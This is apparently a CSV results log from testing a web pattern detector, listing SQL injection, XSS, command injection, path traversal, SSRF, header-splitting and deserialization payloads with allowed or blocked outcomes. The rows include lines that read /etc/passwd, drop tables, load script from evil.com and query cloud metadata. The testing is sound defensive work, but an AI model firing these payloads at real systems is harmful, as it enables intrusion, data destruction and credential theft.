timestamp,attack_type,description,payload,contract_type,expected_gunicorn_block,result,http_status,http_handler,response_body
2025-10-13T15:03:33.868198,SQLi,Classic Tautology,' OR 1=1--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:33.874417,SQLi,Classic Tautology,' OR 1=1--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:33.980858,SQLi,Tautology with Comment,' OR 'a'='a,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:33.983188,SQLi,Tautology with Comment,' OR 'a'='a,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.090307,SQLi,Boolean-based Blind,AND 1=1,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:34.098621,SQLi,Boolean-based Blind,AND 1=1,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:34.206430,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.215212,SQLi,UNION Statement,"UNION SELECT user, password FROM users",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.325398,SQLi,Stacked Query,'; DROP TABLE members;--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.332224,SQLi,Stacked Query,'; DROP TABLE members;--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.441040,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.446799,SQLi,Error-based,"OR 1=CAST(CONCAT(0x7e,(SELECT user())) AS SIGNED)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.552073,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.558595,SQLi,Time-based Blind,"OR IF(1=1, SLEEP(5), 0)",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.667552,SQLi,Authentication Bypass,admin'--,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.674041,SQLi,Authentication Bypass,admin'--,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.783659,SQLi,Double Quote Tautology,""" OR 1=1--",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.790037,SQLi,Double Quote Tautology,""" OR 1=1--",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.899570,SQLi,Wildcard Bypass,' OR '%'=',Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:34.906055,SQLi,Wildcard Bypass,' OR '%'=',Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.015747,XSS,Basic Script Tag,<script>alert('XSS')</script>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.022185,XSS,Basic Script Tag,<script>alert('XSS')</script>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.131154,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.137702,XSS,Image OnError,<img src=x onerror=alert(document.cookie)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.244921,XSS,Body OnLoad,<body onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.251617,XSS,Body OnLoad,<body onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.360486,XSS,SVG OnLoad,<svg/onload=alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.367529,XSS,SVG OnLoad,<svg/onload=alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.476830,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.483657,XSS,Iframe Source,"<iframe src=""javascript:alert(1)"">",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.593024,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.599736,XSS,Case Insensitive,<ScRiPt>alert(1)</sCrIpT>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.704906,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.712753,XSS,No Closing Tag,<script src=http://evil.com/xss.js>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.820425,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.827041,XSS,Anchor Href,"<a href=""javascript:alert(1)"">Click me</a>",Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.936448,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:35.944298,XSS,Input Autofocus,<input onfocus=alert(1) autofocus>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.051076,XSS,Video Poster,<video poster=javascript:alert(1)>,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.058809,XSS,Video Poster,<video poster=javascript:alert(1)>,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""XSS Script/Event"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.168702,Cmd Injection,Simple Pipe,| whoami,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.176686,Cmd Injection,Simple Pipe,| whoami,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.283224,Cmd Injection,Semicolon Separator,; ls -la /,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.290314,Cmd Injection,Semicolon Separator,; ls -la /,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Keyword/Tautology"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.400322,Cmd Injection,Logical AND,&& cat /etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.407782,Cmd Injection,Logical AND,&& cat /etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.514788,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.521609,Cmd Injection,Logical OR,|| ping -c 4 evil.com,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.631271,Cmd Injection,Backticks,`uname -a`,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.638903,Cmd Injection,Backticks,`uname -a`,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Command Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.747759,Cmd Injection,Command Substitution,$(reboot),Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.754105,Cmd Injection,Command Substitution,$(reboot),Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.863765,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.870470,Cmd Injection,Newline Separator,"id
cat /etc/hosts",Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:36.979686,Path Traversal,Parent Directory,../../etc/passwd,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:36.987340,Path Traversal,Parent Directory,../../etc/passwd,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.093626,Path Traversal,Root Directory,/etc/shadow,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:37.100276,Path Traversal,Root Directory,/etc/shadow,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:37.208565,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.215272,Path Traversal,Windows Directory,..\..\..\windows\win.ini,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.324627,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:37.331612,Path Traversal,URL Encoded,%2e%2e%2f%2e%2e%2fetc%2fpasswd,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:37.441005,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:37.447823,Path Traversal,Double URL Encoded,%252e%252e%252fetc%252fpasswd,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:37.556329,Path Traversal,Null Byte,../../etc/passwd%00,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.563402,Path Traversal,Null Byte,../../etc/passwd%00,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Path Traversal"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.672781,SSRF,Localhost,http://localhost/admin,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.679633,SSRF,Localhost,http://localhost/admin,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.788847,SSRF,127.0.0.1,http://127.0.0.1:8080,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.795437,SSRF,127.0.0.1,http://127.0.0.1:8080,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.904712,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:37.912222,SSRF,AWS Metadata Service,http://169.254.169.254/latest/meta-data/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.021222,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Weak Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.024201,SSRF,GCP Metadata Service,http://metadata.google.internal/computeMetadata/v1/,Strict Contract,False,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SSRF Metadata/Loopback"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.131383,SSRF,Internal IP,http://10.0.0.1/,Weak Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:38.139120,SSRF,Internal IP,http://10.0.0.1/,Strict Contract,False,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:38.247735,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.254760,Log Injection,Newline Characters,user=guest%0a%0dmalicious_log_entry,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""SQLi Comments/Bypass"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.360248,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.366925,HTTP Header Inj,Response Splitting,value%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""CRLF/Header Injection"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.473365,Deserialization,Java RMI Header,JRMI,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.480765,Deserialization,Java RMI Header,JRMI,Strict Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
2025-10-13T15:03:38.590490,Deserialization,Python Pickle,"cposix
system
",Weak Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:38.597448,Deserialization,Python Pickle,"cposix
system
",Strict Contract,True,BLOCKED,200,Werkzeug/3.1.3,"{""status"": ""pattern_not_recognized""}"
2025-10-13T15:03:38.706634,Deserialization,.NET Gadget,AAEAAAD/////AQAAAAAAAAAMAgAAAFBTeXN0ZW0,Weak Contract,True,ALLOWED,200,Werkzeug/3.1.3,"{""pattern_name"": ""Deserialization Marker"", ""status"": ""pattern_received""}"
